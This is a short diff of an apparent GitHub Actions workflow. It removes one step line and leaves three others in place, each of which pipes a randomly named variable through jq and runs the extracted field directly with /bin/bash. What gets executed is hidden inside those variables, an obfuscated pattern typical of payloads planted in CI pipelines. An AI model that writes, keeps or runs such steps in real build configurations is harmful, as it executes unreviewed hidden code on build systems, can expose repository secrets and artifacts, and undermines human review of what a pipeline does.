@@ -25,7 +25,6 @@ jobs:
           echo $wno19786 | jq -r .ufd7474 | /bin/bash
           printf '%s' "$w0" | jq -r .eugp5 | /bin/bash
           echo $rul361 | jq -r .drs0205 | /bin/bash
-          printf '%s' "$oae21243" | jq -r .qhpac0 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
